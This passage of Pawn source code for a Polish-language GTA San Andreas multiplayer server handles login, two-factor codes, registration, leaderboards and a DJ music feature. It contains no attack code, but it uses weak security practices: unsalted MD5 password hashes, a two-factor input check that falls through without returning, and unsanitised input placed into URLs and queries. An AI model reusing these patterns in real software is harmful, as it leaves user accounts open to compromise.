		case DIALOG_UNUSED: return 1;
		case DIALOG_AUTHOFF: {
		    if(!response) return 1;
		    format(Player[playerid][Auth], 17, "0");
		    return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Weryfikacja dwuetapowa wy³¹czona. Mo¿esz pozbyæ siê Twojego klucza z innych urz¹dzeñ."); }
		case DIALOG_AUTHCORM:
		{
			if(strlen(inputtext) < 6 || !IsNumeric(inputtext)) {
  				new string[1024];
   				format(string, sizeof string, ""C_ORANGE"WprowadŸ kod z aplikacji {a0a0a0}Google Authenticator"C_ORANGE".", Player[playerid][Name]);
				ShowPlayerDialog(playerid, DIALOG_AUTHCORM, DIALOG_STYLE_INPUT, ""C_ORANGE"Logowanie", string, "Zaloguj", "Kick"); }
			new heh = GoogleAuthenticatorCode(Player[playerid][Auth], gettime());
			new kod = strval(inputtext);
			if(kod != heh) {
			    ShowPlayerDialog(playerid, DIALOG_LOGIN, DIALOG_STYLE_MSGBOX, ""C_ORANGE"Logowanie", ""C_RED"Wprowadzony kod jest nieprawid³owy. Zosta³eœ wyrzucony.", "Zamknij", "");
				DelayedKick(playerid); }
			else {
				Player[playerid][IsLoggedIn] = true;
				if(Player[playerid][Vip] > gettime()) {
					vips++;
          			LoggedOnVip[playerid] = true;
					SendClientMessage(playerid, -1, ""C_YELLOW"Posiadasz aktywne uprawnienia "C_WHITE"VIP"C_YELLOW"."); } 
				if(Player[playerid][Admin] > 0) admins++; 
   				PlayerPlaySound(playerid,1063,0.0,0.0,0.0);
				vSpawned[playerid] = false;
				DamageTaken[playerid] = 0;
				pArena[playerid] = 0;
				Player[playerid][Wizyty]++;
				fakekills[playerid] = 0;
				Ramps[playerid] = true;
 				NaWojnie[playerid] = false;
    			KilledBy[playerid] = -1;
 				OnNonDM[playerid] = false;
 				Eye[playerid] = false;
 				Freezed[playerid] = false;
				CreatePlayerTD(playerid); 
				OnGame[playerid] = -1; 
				RCCheckpoint[playerid] = -1; 
				CatchingPokemon[playerid] = -1; 
				ClanStrefa[playerid] = false; 
				ClanPatriot[playerid] = false; 
				ClanPunkt[playerid] = false; 
				NaSpedycji[playerid] = false;
				ClanTimer[playerid] = 0; 
				TPP[playerid] = 0;
				SkinM4[playerid] = 0;
    			SkinCombat[playerid] = 0;
    			SkinAK[playerid] = 0;
				SkinShotgun[playerid] = 0;
				SkinDE[playerid] = 0;
				SkinKnife[playerid] = 0;
				SkinMP5[playerid] = 0;
				SkinSniper[playerid] = 0;
				SkinSilenced[playerid] = 0;
				if(Player[playerid][House] > -1) {
				    new dom = Player[playerid][House];
				    OplacDomLogowanie(dom); }

				new plrIP[16];
				GetPlayerIp(playerid, plrIP, sizeof(plrIP));
				m_query("UPDATE players SET ip = '%s' WHERE id = %d", plrIP, Player[playerid][ID]);

       			new sqlquerym[1024], tempmail[40];
				format(sqlquerym, sizeof(sqlquerym), "SELECT email FROM players WHERE id = %d", Player[playerid][ID]);
    			m_query(sqlquerym);
    			mysql_store_result();
		    	mysql_fetch_row(sqlquerym, " ");
		    	mysql_free_result();
    			sscanf(sqlquerym, "s[40]", tempmail);
        		format(Player[playerid][Email], 40, "%s", tempmail);

				if(Player[playerid][MuteTime] > gettime()) {
	    			new msgs[256];
	    			format(msgs, sizeof(msgs), "Posiadasz uciszenie na "C_WHITE"%s"C_RED"s.", TimeConvert(Player[playerid][MuteTime] - gettime()));
 					SendClientMessage(playerid, RED, msgs); }

				if(Player[playerid][Gang] > -1)
				{
				   	new ganggid = Player[playerid][Gang];
				   	new s[256];
					if(gColor[ganggid] == 0) format(s, sizeof(s), "%s"C_WHITE"*  "C_ORANGE"Nale¿ysz do klanu {%06x}%s"C_ORANGE". (ID "C_WHITE"%d"C_ORANGE")\n", s, GREY >>> 8, gName[ganggid], ganggid);
					if(gColor[ganggid] == 1) format(s, sizeof(s), "%s"C_WHITE"*  "C_ORANGE"Nale¿ysz do klanu {%06x}%s"C_ORANGE". (ID "C_WHITE"%d"C_ORANGE")\n", s, GREEN >>> 8, gName[ganggid], ganggid);
					if(gColor[ganggid] == 2) format(s, sizeof(s), "%s"C_WHITE"*  "C_ORANGE"Nale¿ysz do klanu {%06x}%s"C_ORANGE". (ID "C_WHITE"%d"C_ORANGE")\n", s, RED >>> 8, gName[ganggid], ganggid);
					if(gColor[ganggid] == 3) format(s, sizeof(s), "%s"C_WHITE"*  "C_ORANGE"Nale¿ysz do klanu {%06x}%s"C_ORANGE". (ID "C_WHITE"%d"C_ORANGE")\n", s, YELLOW >>> 8, gName[ganggid], ganggid);
					if(gColor[ganggid] == 4) format(s, sizeof(s), "%s"C_WHITE"*  "C_ORANGE"Nale¿ysz do klanu {%06x}%s"C_ORANGE". (ID "C_WHITE"%d"C_ORANGE")\n", s, BLUE >>> 8, gName[ganggid], ganggid);
					if(gColor[ganggid] == 5) format(s, sizeof(s), "%s"C_WHITE"*  "C_ORANGE"Nale¿ysz do klanu {%06x}%s"C_ORANGE". (ID "C_WHITE"%d"C_ORANGE")\n", s, ORANGE >>> 8, gName[ganggid], ganggid);
					if(gColor[ganggid] == 6) format(s, sizeof(s), "%s"C_WHITE"*  "C_ORANGE"Nale¿ysz do klanu {%06x}%s"C_ORANGE". (ID "C_WHITE"%d"C_ORANGE")\n", s, MAGENTA >>> 8, gName[ganggid], ganggid);
					if(gColor[ganggid] == 7) format(s, sizeof(s), "%s"C_WHITE"*  "C_ORANGE"Nale¿ysz do klanu {%06x}%s"C_ORANGE". (ID "C_WHITE"%d"C_ORANGE")\n", s, AQUA >>> 8, gName[ganggid], ganggid);
					if(gColor[ganggid] == 8) format(s, sizeof(s), "%s"C_WHITE"*  "C_ORANGE"Nale¿ysz do klanu {%06x}%s"C_ORANGE". (ID "C_WHITE"%d"C_ORANGE")\n", s, GOLD >>> 8, gName[ganggid], ganggid);
					if(gColor[ganggid] == 9) format(s, sizeof(s), "%s"C_WHITE"*  "C_ORANGE"Nale¿ysz do klanu {%06x}%s"C_ORANGE". (ID "C_WHITE"%d"C_ORANGE")\n", s, SEAGREEN >>> 8, gName[ganggid], ganggid);
					if(gColor[ganggid] == 10) format(s, sizeof(s), "%s"C_WHITE"*  "C_ORANGE"Nale¿ysz do klanu {%06x}%s"C_ORANGE". (ID "C_WHITE"%d"C_ORANGE")\n", s, OLIVE >>> 8, gName[ganggid], ganggid);
					if(gColor[ganggid] == 11) format(s, sizeof(s), "%s"C_WHITE"*  "C_ORANGE"Nale¿ysz do klanu {%06x}%s"C_ORANGE". (ID "C_WHITE"%d"C_ORANGE")\n", s, SPRINGGREEN >>> 8, gName[ganggid], ganggid);
 					if(gColor[ganggid] == 12) format(s, sizeof(s), "%s"C_WHITE"*  "C_ORANGE"Nale¿ysz do klanu {%06x}%s"C_ORANGE". (ID "C_WHITE"%d"C_ORANGE")\n", s, MAROON >>> 8, gName[ganggid], ganggid);
					if(gColor[ganggid] == 13) format(s, sizeof(s), "%s"C_WHITE"*  "C_ORANGE"Nale¿ysz do klanu {%06x}%s"C_ORANGE". (ID "C_WHITE"%d"C_ORANGE")\n", s, LIME >>> 8, gName[ganggid], ganggid);
					if(gColor[ganggid] == 14) format(s, sizeof(s), "%s"C_WHITE"*  "C_ORANGE"Nale¿ysz do klanu {%06x}%s"C_ORANGE". (ID "C_WHITE"%d"C_ORANGE")\n", s, MEDIUMAQUA >>> 8, gName[ganggid], ganggid);
					SendClientMessage(playerid, -1, s);
				}

				SetPlayerMoney(playerid, Player[playerid][Cash]);
               	SetPVarInt(playerid, "HouseKey", Player[playerid][House]);

				SpecToggle(playerid, 0);
				SpawnPlayer(playerid);

				switch(random(12)) {
	    			case 0: SetPlayerPos(playerid, 2504.6216,-1668.8967,13.4338);
    				case 1: SetPlayerPos(playerid, -2020.9414,333.7824,35.1645);
   					case 2: SetPlayerPos(playerid, -1956.0208,294.3318,35.4688);
   					case 3: SetPlayerPos(playerid, 2121.8608,1001.0126,10.8203);
    				case 4: SetPlayerPos(playerid, 2034.1293,-1413.9211,16.9922);
    				case 5: SetPlayerPos(playerid, 1873.1091,-1384.3479,13.5397);
					case 6: SetPlayerPos(playerid, 1932.9066,621.7777,10.8303);
					case 7: SetPlayerPos(playerid, -1854.1526,-91.6064,15.1974);
					case 8: SetPlayerPos(playerid, -1838.3065,155.8409,15.1172);
					case 9: SetPlayerPos(playerid, 1955.0818,1343.1653,15.4049);
					case 10: SetPlayerPos(playerid, -305.1185,1746.6633,42.7813);
					case 11: SetPlayerPos(playerid, 2379.0496,1586.2595,10.7919); }

	    		m_query("UPDATE players SET playerid = %d WHERE id = %d", playerid, Player[playerid][ID]);

				m_query("SELECT * FROM privcars WHERE ownerid = %d", Player[playerid][ID]);
				mysql_store_result();
				if(mysql_num_rows() > 0) {
					HavePrivcar[playerid] = true;
					mysql_free_result(); }
				else mysql_free_result();
				SetSpawnInfo(playerid, NO_TEAM, Player[playerid][Skin], 2121.8608,1001.0126,10.8203, 0.0, 0, 0, 0, 0, 0, 0); }
		}
		case DIALOG_LOGIN:
		{
			if (!response) {
				Kick(playerid);
				return 1; }
			if (strcmp(MD5_Hash(inputtext), Player[playerid][Password]) == 0)
   			{
				if(strlen(Player[playerid][Auth]) > 1) {
					new string[1024];
   					format(string, sizeof string, ""C_ORANGE"WprowadŸ kod z aplikacji {a0a0a0}Google Authenticator"C_ORANGE".", Player[playerid][Name]);
					ShowPlayerDialog(playerid, DIALOG_AUTHCORM, DIALOG_STYLE_INPUT, ""C_ORANGE"Logowanie", string, "Zaloguj", "Kick"); }
				else {
					Player[playerid][IsLoggedIn] = true;
					if(Player[playerid][Vip] > gettime()) {
						vips++;
          				LoggedOnVip[playerid] = true;
						SendClientMessage(playerid, -1, ""C_YELLOW"Posiadasz aktywne uprawnienia "C_WHITE"VIP"C_YELLOW"."); } 
					if(Player[playerid][Admin] > 0) admins++; 
   					PlayerPlaySound(playerid,1063,0.0,0.0,0.0);
					vSpawned[playerid] = false;
					DamageTaken[playerid] = 0;
					pArena[playerid] = 0;
					Player[playerid][Wizyty]++;
					fakekills[playerid] = 0;
					Ramps[playerid] = true;
 					NaWojnie[playerid] = false;
    				KilledBy[playerid] = -1;
 					OnNonDM[playerid] = false;
 					Eye[playerid] = false;
 					Freezed[playerid] = false;
					CreatePlayerTD(playerid); 
					OnGame[playerid] = -1; 
					RCCheckpoint[playerid] = -1; 
					CatchingPokemon[playerid] = -1; 
					ClanStrefa[playerid] = false; 
					ClanPatriot[playerid] = false; 
					ClanPunkt[playerid] = false; 
					NaSpedycji[playerid] = false;
					ClanTimer[playerid] = 0; 
					TPP[playerid] = 0;
					SkinM4[playerid] = 0;
    				SkinCombat[playerid] = 0;
    				SkinAK[playerid] = 0;
					SkinShotgun[playerid] = 0;
					SkinDE[playerid] = 0;
					SkinKnife[playerid] = 0;
					SkinMP5[playerid] = 0;
					SkinSniper[playerid] = 0;
					SkinSilenced[playerid] = 0;
					if(Player[playerid][House] > -1) {
					    new dom = Player[playerid][House];
					    OplacDomLogowanie(dom); }

					new plrIP[16];
					GetPlayerIp(playerid, plrIP, sizeof(plrIP));
					m_query("UPDATE players SET ip = '%s' WHERE id = %d", plrIP, Player[playerid][ID]);

        			new sqlquerym[1024], tempmail[40];
    				format(sqlquerym, sizeof(sqlquerym), "SELECT email FROM players WHERE id = %d", Player[playerid][ID]);
    				m_query(sqlquerym);
    				mysql_store_result();
		    		mysql_fetch_row(sqlquerym, " ");
		    		mysql_free_result();
    				sscanf(sqlquerym, "s[40]", tempmail);
        			format(Player[playerid][Email], 40, "%s", tempmail);

					if(Player[playerid][MuteTime] > gettime()) {
	    				new msgs[256];
	    				format(msgs, sizeof(msgs), "Posiadasz uciszenie na "C_WHITE"%s"C_RED"s.", TimeConvert(Player[playerid][MuteTime] - gettime()));
 						SendClientMessage(playerid, RED, msgs); }

					if(Player[playerid][Gang] > -1)
					{
				    	new ganggid = Player[playerid][Gang];
				    	new s[256];
						if(gColor[ganggid] == 0) format(s, sizeof(s), "%s"C_WHITE"*  "C_ORANGE"Nale¿ysz do klanu {%06x}%s"C_ORANGE". (ID "C_WHITE"%d"C_ORANGE")\n", s, GREY >>> 8, gName[ganggid], ganggid);
						if(gColor[ganggid] == 1) format(s, sizeof(s), "%s"C_WHITE"*  "C_ORANGE"Nale¿ysz do klanu {%06x}%s"C_ORANGE". (ID "C_WHITE"%d"C_ORANGE")\n", s, GREEN >>> 8, gName[ganggid], ganggid);
						if(gColor[ganggid] == 2) format(s, sizeof(s), "%s"C_WHITE"*  "C_ORANGE"Nale¿ysz do klanu {%06x}%s"C_ORANGE". (ID "C_WHITE"%d"C_ORANGE")\n", s, RED >>> 8, gName[ganggid], ganggid);
						if(gColor[ganggid] == 3) format(s, sizeof(s), "%s"C_WHITE"*  "C_ORANGE"Nale¿ysz do klanu {%06x}%s"C_ORANGE". (ID "C_WHITE"%d"C_ORANGE")\n", s, YELLOW >>> 8, gName[ganggid], ganggid);
						if(gColor[ganggid] == 4) format(s, sizeof(s), "%s"C_WHITE"*  "C_ORANGE"Nale¿ysz do klanu {%06x}%s"C_ORANGE". (ID "C_WHITE"%d"C_ORANGE")\n", s, BLUE >>> 8, gName[ganggid], ganggid);
						if(gColor[ganggid] == 5) format(s, sizeof(s), "%s"C_WHITE"*  "C_ORANGE"Nale¿ysz do klanu {%06x}%s"C_ORANGE". (ID "C_WHITE"%d"C_ORANGE")\n", s, ORANGE >>> 8, gName[ganggid], ganggid);
						if(gColor[ganggid] == 6) format(s, sizeof(s), "%s"C_WHITE"*  "C_ORANGE"Nale¿ysz do klanu {%06x}%s"C_ORANGE". (ID "C_WHITE"%d"C_ORANGE")\n", s, MAGENTA >>> 8, gName[ganggid], ganggid);
						if(gColor[ganggid] == 7) format(s, sizeof(s), "%s"C_WHITE"*  "C_ORANGE"Nale¿ysz do klanu {%06x}%s"C_ORANGE". (ID "C_WHITE"%d"C_ORANGE")\n", s, AQUA >>> 8, gName[ganggid], ganggid);
						if(gColor[ganggid] == 8) format(s, sizeof(s), "%s"C_WHITE"*  "C_ORANGE"Nale¿ysz do klanu {%06x}%s"C_ORANGE". (ID "C_WHITE"%d"C_ORANGE")\n", s, GOLD >>> 8, gName[ganggid], ganggid);
						if(gColor[ganggid] == 9) format(s, sizeof(s), "%s"C_WHITE"*  "C_ORANGE"Nale¿ysz do klanu {%06x}%s"C_ORANGE". (ID "C_WHITE"%d"C_ORANGE")\n", s, SEAGREEN >>> 8, gName[ganggid], ganggid);
						if(gColor[ganggid] == 10) format(s, sizeof(s), "%s"C_WHITE"*  "C_ORANGE"Nale¿ysz do klanu {%06x}%s"C_ORANGE". (ID "C_WHITE"%d"C_ORANGE")\n", s, OLIVE >>> 8, gName[ganggid], ganggid);
						if(gColor[ganggid] == 11) format(s, sizeof(s), "%s"C_WHITE"*  "C_ORANGE"Nale¿ysz do klanu {%06x}%s"C_ORANGE". (ID "C_WHITE"%d"C_ORANGE")\n", s, SPRINGGREEN >>> 8, gName[ganggid], ganggid);
 						if(gColor[ganggid] == 12) format(s, sizeof(s), "%s"C_WHITE"*  "C_ORANGE"Nale¿ysz do klanu {%06x}%s"C_ORANGE". (ID "C_WHITE"%d"C_ORANGE")\n", s, MAROON >>> 8, gName[ganggid], ganggid);
						if(gColor[ganggid] == 13) format(s, sizeof(s), "%s"C_WHITE"*  "C_ORANGE"Nale¿ysz do klanu {%06x}%s"C_ORANGE". (ID "C_WHITE"%d"C_ORANGE")\n", s, LIME >>> 8, gName[ganggid], ganggid);
						if(gColor[ganggid] == 14) format(s, sizeof(s), "%s"C_WHITE"*  "C_ORANGE"Nale¿ysz do klanu {%06x}%s"C_ORANGE". (ID "C_WHITE"%d"C_ORANGE")\n", s, MEDIUMAQUA >>> 8, gName[ganggid], ganggid);
						SendClientMessage(playerid, -1, s);
					}

					SetPlayerMoney(playerid, Player[playerid][Cash]);
                	SetPVarInt(playerid, "HouseKey", Player[playerid][House]);

					SpecToggle(playerid, 0);
					SpawnPlayer(playerid);

					switch(random(12)) {
	    				case 0: SetPlayerPos(playerid, 2504.6216,-1668.8967,13.4338);
    					case 1: SetPlayerPos(playerid, -2020.9414,333.7824,35.1645);
   						case 2: SetPlayerPos(playerid, -1956.0208,294.3318,35.4688);
   						case 3: SetPlayerPos(playerid, 2121.8608,1001.0126,10.8203);
    					case 4: SetPlayerPos(playerid, 2034.1293,-1413.9211,16.9922);
    					case 5: SetPlayerPos(playerid, 1873.1091,-1384.3479,13.5397);
						case 6: SetPlayerPos(playerid, 1932.9066,621.7777,10.8303);
						case 7: SetPlayerPos(playerid, -1854.1526,-91.6064,15.1974);
						case 8: SetPlayerPos(playerid, -1838.3065,155.8409,15.1172);
						case 9: SetPlayerPos(playerid, 1955.0818,1343.1653,15.4049);
						case 10: SetPlayerPos(playerid, -305.1185,1746.6633,42.7813);
						case 11: SetPlayerPos(playerid, 2379.0496,1586.2595,10.7919); }

	    			m_query("UPDATE players SET playerid = %d WHERE id = %d", playerid, Player[playerid][ID]);

					m_query("SELECT * FROM privcars WHERE ownerid = %d", Player[playerid][ID]);
					mysql_store_result();
					if(mysql_num_rows() > 0) {
						HavePrivcar[playerid] = true;
						mysql_free_result(); }
					else mysql_free_result();
					SetSpawnInfo(playerid, NO_TEAM, Player[playerid][Skin], 2121.8608,1001.0126,10.8203, 0.0, 0, 0, 0, 0, 0, 0);
				}
			}
			else
			{
				Player[playerid][LoginAttempts]++;

				if (Player[playerid][LoginAttempts] >= 3)
				{
					ShowPlayerDialog(playerid, DIALOG_UNUSED, DIALOG_STYLE_MSGBOX, ""C_ORANGE"Logowanie", ""C_RED"Wpisa³eœ niepoprawne has³o (3 razy).", "Dalej", "");
					DelayedKick(playerid);
				}
				else ShowPlayerDialog(playerid, DIALOG_LOGIN, DIALOG_STYLE_PASSWORD, ""C_ORANGE"Logowanie", ""C_RED"Wprowadzone has³o jest nieprawid³owe. Spróbuj ponownie.", "Zaloguj", "Kick");
			}
		}
		case DIALOG_REGISTER:
		{
			if (!response) {
				Kick(playerid);
				return 1; }

			if (strlen(inputtext) <= 4 || strlen(inputtext) >= 32) return ShowPlayerDialog(playerid, DIALOG_REGISTER, DIALOG_STYLE_PASSWORD, ""C_ORANGE"Rejestracja", ""C_RED"Twoje has³o powinno mieœciæ siê w przedziale 5-32 znaków. Spróbuj ponownie.", "Zarejestruj", "Kick");
			Player[playerid][Level] = 1;
      		format(Player[playerid][Email], 1, "0");
      		PlayerPlaySound(playerid,1063,0.0,0.0,0.0);
			Player[playerid][House] = -1;
			vSpawned[playerid] = false;
			DamageTaken[playerid] = 0;
			pArena[playerid] = 0;
			fakekills[playerid] = 0;
			Ramps[playerid] = true;
 			NaWojnie[playerid] = false;
    		KilledBy[playerid] = -1;
 			OnNonDM[playerid] = false;
 			Eye[playerid] = false;
 			Freezed[playerid] = false;
			CreatePlayerTD(playerid); 
			OnGame[playerid] = -1; 
			RCCheckpoint[playerid] = -1; 
			CatchingPokemon[playerid] = -1; 
			ClanStrefa[playerid] = false; 
			ClanPatriot[playerid] = false; 
			ClanPunkt[playerid] = false; 
			NaSpedycji[playerid] = false;
			ClanTimer[playerid] = 0; 
			TPP[playerid] = 0;
			SkinM4[playerid] = 0;
    		SkinCombat[playerid] = 0;
    		SkinAK[playerid] = 0;
			SkinShotgun[playerid] = 0;
			SkinDE[playerid] = 0;
			SkinKnife[playerid] = 0;
			SkinMP5[playerid] = 0;
			SkinSniper[playerid] = 0;
			SkinSilenced[playerid] = 0;
			Player[playerid][Wizyty] = 0;

			mysql_real_escape_string(inputtext, inputtext);
			mysql_query("SELECT id FROM players");
			mysql_store_result();
			new users = mysql_num_rows();
			mysql_free_result();
			SetPlayerSkin(playerid, random(311));
			format(Player[playerid][Password], 65, "%s", MD5_Hash(inputtext));
			Player[playerid][ID] = users;
			Player[playerid][IsLoggedIn] = true;
			Player[playerid][Gang] = -1;
			Player[playerid][GL] = 60.0;
			m_query("INSERT INTO players (id, username, password, house, cbug) VALUES (%d, '%s', '%s', 501, 60)", users, Player[playerid][Name], Player[playerid][Password]);
			Player[playerid][Vip] = gettime() + 86400 * 3;
			if(Player[playerid][Vip] > gettime()) {
				vips++;
				SendClientMessage(playerid, -1, ""C_YELLOW"Posiadasz aktywne uprawnienia "C_WHITE"VIP"C_YELLOW"."); } 

			new plrIP[16];
			GetPlayerIp(playerid, plrIP, sizeof(plrIP));
			m_query("UPDATE players SET ip = '%s' WHERE id = %d", plrIP, Player[playerid][ID]);

			Registered[playerid] = true;
			SpecToggle(playerid, 0);
			SetSpawnInfo(playerid, NO_TEAM, 0, 2121.8608,1001.0126,10.8203, 0.0, 0, 0, 0, 0, 0, 0);
			SpawnPlayer(playerid);
			Player[playerid][Hitman] = 0;
			format(Player[playerid][ItemName1], 5, "Brak");
			format(Player[playerid][ItemName2], 5, "Brak");
			format(Player[playerid][ItemName3], 5, "Brak");
			format(Player[playerid][ItemName4], 5, "Brak");
			format(Player[playerid][ItemName5], 5, "Brak");
			format(Player[playerid][ItemName6], 5, "Brak");
			format(Player[playerid][ItemName7], 5, "Brak");
			format(Player[playerid][ItemName8], 5, "Brak");

			switch(random(12)) {
	    		case 0: SetPlayerPos(playerid, 2504.6216,-1668.8967,13.4338);
    			case 1: SetPlayerPos(playerid, -2020.9414,333.7824,35.1645);
   				case 2: SetPlayerPos(playerid, -1956.0208,294.3318,35.4688);
   				case 3: SetPlayerPos(playerid, 2121.8608,1001.0126,10.8203);
    			case 4: SetPlayerPos(playerid, 2034.1293,-1413.9211,16.9922);
    			case 5: SetPlayerPos(playerid, 1873.1091,-1384.3479,13.5397);
				case 6: SetPlayerPos(playerid, 1932.9066,621.7777,10.8303);
				case 7: SetPlayerPos(playerid, -1854.1526,-91.6064,15.1974);
				case 8: SetPlayerPos(playerid, -1838.3065,155.8409,15.1172);
				case 9: SetPlayerPos(playerid, 1955.0818,1343.1653,15.4049);
				case 10: SetPlayerPos(playerid, -305.1185,1746.6633,42.7813);
				case 11: SetPlayerPos(playerid, 2379.0496,1586.2595,10.7919); }

	    	m_query("UPDATE players SET playerid = %d WHERE id = %d", playerid, Player[playerid][ID]);
			SaveAllData(playerid);
			new actual = users + 1;
			new regstr[256];
			format(regstr, sizeof(regstr), ""C_WHITE"Witamy naszego nowego gracza, "C_NICK"%s(%d)"C_WHITE"! Jest to "C_NICK"%d "C_WHITE"gracz tego serwera!", Player[playerid][Name], playerid, actual);
			SendClientMessageToAll(-1, regstr);
			SendClientMessage(playerid, -1, "{FF0000}Graj¹c u nas akceptujesz regulamin serwera zawarty na forum "C_YELLOW""FORUM"{FF0000}.");
			OnPlayerRegister(playerid);
		}
		case DIALOG_SKINL: {
		    if(response) return cmd_loadskin(playerid, " ");
		    else return ShowPlayerDialog(playerid, DIALOG_UNUSED, DIALOG_STYLE_MSGBOX, ""NAZWA"", ""C_WHITE"Zawsze mo¿esz wczytaæ poprzednio u¿ywanego skina komend¹ "C_LOLIVE"/loadskin"C_WHITE".", "Zamknij", ""); }
		case DIALOG_KARTA:
		{
		    if(response)
		    {
		        RemoveItem(playerid, "{FFFFFF}Karta kolekcjonerska", 1);
 				if(pAch[playerid][8] < 1) {
					pAch[playerid][8] = 1;
					AddExp(playerid, 200);
					Sound(playerid,1137,0.0,0.0,0.0);
					SendClientMessageEx(playerid, -1, "Nowe osi¹gniêcie: "C_NICK"Kolekcjoner", "New achievement: "C_NICK"Kolekcjoner"); }
		        switch(listitem)
		        {
		            case 0: {
		                new exp = random(700);
		            	AddExp(playerid, exp);
		            	new info[128];
						format(info, sizeof(info), ""PLUS""C_LOLIVE"Otrzyma³eœ/aœ {FF0000}%d "C_LOLIVE"EXP.", exp);
						SendClientMessage(playerid, -1, info); }
		            case 1: {
		                new cash = random(500000);
		            	Player[playerid][Cash] += cash;
		            	new info[128];
						format(info, sizeof(info), ""PLUS""C_LOLIVE"Otrzyma³eœ/aœ {FF0000}%d"C_LOLIVE"$.", cash);
						SendClientMessage(playerid, -1, info); }
		            case 2: {
		                new exp = random(1000);
		            	AddExp(playerid, exp);
		            	new info[128];
						format(info, sizeof(info), ""PLUS""C_LOLIVE"Otrzyma³eœ/aœ {FF0000}%d "C_LOLIVE"EXP.", exp);
						SendClientMessage(playerid, -1, info);
						switch(random(5)) {
							case 2: {
							Player[playerid][vCash] += 1;
							format(info, sizeof(info), ""PLUS""C_LOLIVE"Otrzyma³eœ/aœ {FF0000}1 z³"C_LOLIVE"!");
							SendClientMessage(playerid, -1, info); } } }
		            case 3: {
		            	AddExp(playerid, 200);
		            	new info[128];
						format(info, sizeof(info), ""PLUS""C_LOLIVE"Otrzyma³eœ/aœ {FF0000}200 "C_LOLIVE"EXP.");
						SendClientMessage(playerid, -1, info); }
		            case 4: {
		            	Player[playerid][Cash] += 15000;
		            	new info[128];
						format(info, sizeof(info), ""PLUS""C_LOLIVE"Otrzyma³eœ/aœ {FF0000}15000"C_LOLIVE"$.");
						SendClientMessage(playerid, -1, info); }
		        }
		    }
		}
	    case DIALOG_TOP:
	    {
	        if(response)
	        {
	            new s[100], list[350] = ""C_BLUE1"Pozycja\t"C_BLUE1"Gracz\t"C_BLUE1"Wartoœæ\n";

	            switch(listitem)
	            {
	                case 0:
	                {
						mysql_query("SELECT @place := @place + 1 as place, username, kills, '\\n' FROM players, (select @place := 0) p WHERE kills > 0 ORDER BY kills DESC LIMIT 10");
						mysql_store_result();

						while(mysql_fetch_row(s, "\t")) strins(list, s, strlen(list));
					}
					case 1:
	                {
						mysql_query("SELECT @place := @place + 1 as place, username, deaths, '\\n' FROM players, (select @place := 0) p WHERE deaths > 0 ORDER BY deaths DESC LIMIT 10");
						mysql_store_result();

						while(mysql_fetch_row(s, "\t")) strins(list, s, strlen(list));
					}
					case 2:
	                {
						mysql_query("SELECT @place := @place + 1 as place, username, waluta, '\\n' FROM players, (select @place := 0) p WHERE waluta > 0 ORDER BY waluta DESC LIMIT 10");
						mysql_store_result();

						while(mysql_fetch_row(s, "\t")) strins(list, s, strlen(list));
					}
					case 3:
	                {
						mysql_query("SELECT @place := @place + 1 as place, username, exp, '\\n' FROM players, (select @place := 0) p WHERE exp > 0 ORDER BY exp DESC LIMIT 10");
						mysql_store_result();

						while(mysql_fetch_row(s, "\t")) strins(list, s, strlen(list));
					}
					case 4:
	                {
						mysql_query("SELECT @place := @place + 1 as place, username, vcash, '\\n' FROM players, (select @place := 0) p WHERE vcash > 0 ORDER BY vcash DESC LIMIT 10");
						mysql_store_result();

						while(mysql_fetch_row(s, "\t")) strins(list, s, strlen(list));
					}
					case 5:
	                {
						mysql_query("SELECT @place := @place + 1 as place, username, visits, '\\n' FROM players, (select @place := 0) p WHERE visits > 0 ORDER BY visits DESC LIMIT 10");
						mysql_store_result();

						while(mysql_fetch_row(s, "\t")) strins(list, s, strlen(list));
					}
					case 6:
	                {
						mysql_query("SELECT @place := @place + 1 as place, username, czat, '\\n' FROM players, (select @place := 0) p WHERE czat > 0 ORDER BY czat DESC LIMIT 10");
						mysql_store_result();

						while(mysql_fetch_row(s, "\t")) strins(list, s, strlen(list));
					}
					case 7:
	                {
						mysql_query("SELECT @place := @place + 1 as place, username, potwory, '\\n' FROM players, (select @place := 0) p WHERE potwory > 0 ORDER BY potwory DESC LIMIT 10");
						mysql_store_result();

						while(mysql_fetch_row(s, "\t")) strins(list, s, strlen(list));
					}
					case 8:
	                {
						mysql_query("SELECT @place := @place + 1 as place, username, cbug, '\\n' FROM players, (select @place := 0) p WHERE cbug < 60.0 && cbug > 0.0 ORDER BY cbug ASC LIMIT 10");
						mysql_store_result();

						while(mysql_fetch_row(s, "\t")) strins(list, s, strlen(list));
					}
					case 9:
	                {
						mysql_query("SELECT @place := @place + 1 as place, ownername, dist, '\\n' FROM privcars, (select @place := 0) p WHERE dist > 0.0 ORDER BY dist DESC LIMIT 10");
						mysql_store_result();

						while(mysql_fetch_row(s, "\t")) strins(list, s, strlen(list));
					}
					case 10:
	                {
						mysql_query("SELECT @place := @place + 1 as place, username, solo, '\\n' FROM players, (select @place := 0) p WHERE solo > 0 ORDER BY solo DESC LIMIT 10");
						mysql_store_result();

						while(mysql_fetch_row(s, "\t")) strins(list, s, strlen(list));
					}
					case 11:
	                {
						mysql_query("SELECT @place := @place + 1 as place, username, rud, '\\n' FROM players, (select @place := 0) p WHERE rud > 0 ORDER BY rud DESC LIMIT 10");
						mysql_store_result();

						while(mysql_fetch_row(s, "\t")) strins(list, s, strlen(list));
					}
				}
				mysql_free_result();
				ShowPlayerDialog(playerid, DIALOG_UNUSED, DIALOG_STYLE_TABLIST_HEADERS, inputtext, list, "Zamknij", "");
			}
			return 1;
		}
		case DIALOG_DJYT:
		{
	        if(response) {
				if(!strlen(inputtext)) return 0;
				printf("[dj] %s - %s", Player[playerid][Name], inputtext);
				format(DJMusic,sizeof(DJMusic),"http://www.youtubeinmp3.com/fetch/?video=%s",inputtext);
				DJPlaying = true;
				Loop(x, MAX_PLAYERS) DJHear[x] = false; }
		}
		case DIALOG_DJ:
		{
			if(!response) return 1;
			if(response)
			{
			    switch(listitem)
			    {
			        case 0: return ShowPlayerDialog(playerid, DIALOG_DJYT, DIALOG_STYLE_INPUT, "{D760FF}Konsola DJ",""C_WHITE"Wklej poni¿ej link do utworu, który chcesz odtworzyæ.","Graj","Zamknij");
			        case 1: {
			                Loop(x, MAX_PLAYERS) {
								if(IsPlayerInRangeOfPoint(x, 5.0, -314.0115,1764.9315,43.9387)) StopAudioStreamForPlayer(x); }
							DJPlaying = false;
							SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Odtwarzanie utworu zatrzymane."); }
			    }
			}
		}
		case DIALOG_BANK:
		{
			if(!response) return 1;
			if(response)
			{
			    switch(listitem)
			    {
			        case 0: {
